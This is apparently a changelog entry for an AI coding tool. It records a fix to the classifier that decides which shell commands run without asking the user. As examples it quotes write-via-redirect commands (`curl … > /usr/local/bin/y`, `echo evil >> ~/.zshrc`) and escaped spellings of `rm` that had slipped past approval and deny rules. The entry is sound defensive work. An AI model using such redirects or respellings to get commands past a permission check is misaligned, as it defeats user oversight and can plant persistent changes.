---
"cognia-next": patch
---

Shell auto-approval no longer ignores redirects or command respellings. A safe-looking command that writes a file — `curl https://x > /usr/local/bin/y`, `echo evil >> ~/.zshrc` — was classified "read-only" and auto-approved, because the classifier only ever saw the head command. Redirects are now parsed out of the command and any write to somewhere other than `/dev/null` floors the verdict at "ask"; discard redirects and descriptor duplications (`2>&1`) still auto-approve. `echo hi 2>&1` also stops being downgraded to "ask" by a phantom command named `1`, which is what the old `&` splitting produced. Separately, a head written as `r\m`, `\rm` or `$'\x72\x6d'` now classifies as `rm` rather than as an unrecognized command, and a deny rule is additionally matched against the command's canonical spelling so it cannot be sidestepped by requoting — on both the renderer and the sidecar gate.
